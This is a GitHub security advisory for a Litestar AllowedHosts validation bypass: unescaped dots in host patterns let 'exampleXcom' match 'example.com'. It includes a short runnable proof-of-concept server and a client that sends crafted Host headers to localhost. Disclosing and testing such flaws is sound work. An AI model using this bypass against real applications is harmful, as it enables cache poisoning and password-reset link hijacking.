# [M] Litestar's AllowedHosts has a validation bypass due to unescaped regex metacharacters in configured host patterns

## Summary
Severity: Medium
Advisory: GHSA-93ph-p7v4-hwh4
CVE: CVE-2026-25479
CWE: CWE-185
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-93ph-p7v4-hwh4
Type: github-advisory

## Affected
- PyPI: `litestar` — affected >=2.19.0 <2.20.0

## Details
### Summary
AllowedHosts host validation can be bypassed because configured host patterns are turned into regular expressions without escaping regex metacharacters (notably .). A configured allowlist entry like example.com can match exampleXcom

### Details
In litestar.middleware.allowed_hosts, allowlist entries are compiled into regex patterns in a way that allows regex metacharacters to retain special meaning (e.g., . matches any character). This enables a bypass where an attacker supplies a host that matches the regex but is not the intended literal hostname.

### PoC
Server (poc_allowed_hosts_server.py)

```
from litestar import Litestar, get
from litestar.middleware.allowed_hosts import AllowedHostsConfig

@get("/")
async def index() -> str:
    return "ok"

config = AllowedHostsConfig(allowed_hosts=["example.com"])
app = Litestar([index], allowed_hosts_config=config)
```

`uvicorn poc_allowed_hosts_server:app --host 127.0.0.1 --port 8001`

Client (poc_allowed_hosts_client.py)

```
import http.client

def req(host_header: str) -> tuple[int, bytes]:
    c = http.client.HTTPConnection("127.0.0.1", 8001, timeout=3)
    c.request("GET", "/", headers={"Host": host_header})
    r = c.getresponse()
    body = r.read()
    c.close()
    return r.status, body

print("evil.com:", *req("evil.com"))
print("exampleXcom:", *req("exampleXcom"))
```

Expected (vulnerable behavior):
Host: evil.com → 400 invalid host

Host: exampleXcom → 200 ok (bypass)

### Impact
Type: security control bypass (host allowlist)
Who is impacted: apps relying on AllowedHosts to prevent Host header attacks (cache poisoning, absolute URL construction abuse, password reset link poisoning, etc.). The downstream impact depends on app behavior, but the bypass defeats a core mitigation layer.

## References
- https://github.com/litestar-org/litestar/security/advisories/GHSA-93ph-p7v4-hwh4
- https://nvd.nist.gov/vuln/detail/CVE-2026-25479
- https://github.com/litestar-org/litestar/commit/06b36f481d1bfea6f19995cfb4f203aba45c4ace
- https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0
- https://github.com/litestar-org/litestar
- https://github.com/litestar-org/litestar/releases/tag/v2.20.0
